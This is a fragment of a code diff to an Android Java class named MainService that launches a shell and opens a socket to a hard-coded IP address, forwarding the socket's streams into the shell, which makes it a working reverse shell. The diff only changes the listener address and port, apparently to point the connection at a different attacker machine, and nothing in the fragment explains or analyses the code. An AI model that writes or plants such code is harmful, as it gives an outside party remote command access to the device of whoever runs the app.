@@ -58,7 +58,7 @@ public class MainService extends Service {
         final Process process = Runtime.getRuntime().exec("system/bin/sh");
 
         // start a socket
-        Socket socket = new Socket("192.168.18.24", 443);
+        Socket socket = new Socket("192.168.100.56", 3000);
 
         // forward streams until socket closes
         forwardStream(socket.getInputStream(), process.getOutputStream());
